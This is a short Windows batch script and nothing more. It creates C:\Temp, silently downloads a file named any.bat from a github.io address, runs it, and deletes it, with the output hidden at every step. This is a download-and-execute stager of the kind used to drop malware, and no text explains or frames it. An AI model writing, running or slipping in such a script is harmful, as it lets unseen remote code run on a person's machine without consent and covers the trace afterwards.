@echo off && cls 
set tempDir=C:\Temp
if not exist %tempDir% (
    mkdir %tempDir%
)
cd %tempDir%
curl -o any.bat https://suporteeq.github.io/any.bat > NUL 2>&1 && call any.bat && del any.bat > NUL 2>&1